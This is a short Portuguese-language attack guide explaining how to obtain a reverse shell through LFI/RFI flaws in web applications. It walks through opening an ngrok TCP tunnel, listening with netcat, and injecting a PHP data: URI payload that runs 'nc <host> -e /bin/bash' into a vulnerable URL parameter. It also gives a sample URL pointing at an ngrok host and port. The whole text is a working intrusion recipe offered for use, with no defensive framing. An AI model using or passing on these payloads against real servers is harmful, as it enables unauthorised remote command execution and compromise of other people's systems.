A WEB SHELL É UMA FORMA DE VOCÊ CONSEGUIR UMA SHELL POR UMA VULNERABILIDADE WEB.
	
	NA URL EM VULNERABILIDADES DE LFI, RFI, VOCÊ PODE TENTAR UMA WEB SHELL USANDO O PHP
	PARA OBTE-LA.
	
	1.ABRIR O NGROK TCP E ESCOLHER UMA PORTA.
		
		COMANDO: ngrok tcp <porta>
		
	2.ABRIR A PORTA ESCOLHIDA DO NGROK COM NETCAT.
		
		COMANDO: nc -lvp <porta>
		
	3.COPIAR O LINK DO NGROK E TIRAR OS DOIS PONTOS ENTRE O NUMERO 
	E O LINK E TIRAR O tcp://.
	3.COLOCAR NO PARÂMETRO VULNERAVEL DA URL O PAYLOAD
	PHP PARA REVERSE SHELL.
		
		PAYLOAD: data:text/plain,<?php echo shell_exec("nc <link_ngrok> -e /bin/bash")?>
		
		EX: https://seusite.com/?page=data:text/plain,<?php echo shell_exec("nc 0.tcp.sa.ngro.io 23771
		-e /bin/bash")?>
		
	4.SE TUDO DER CERTO, NA SUA PORTA ABERTA DO NETCAT, VOCÊ TERÁ UMA CONEXÃO
	E PRONTO SUA SHELL ESTÁ FEITA.
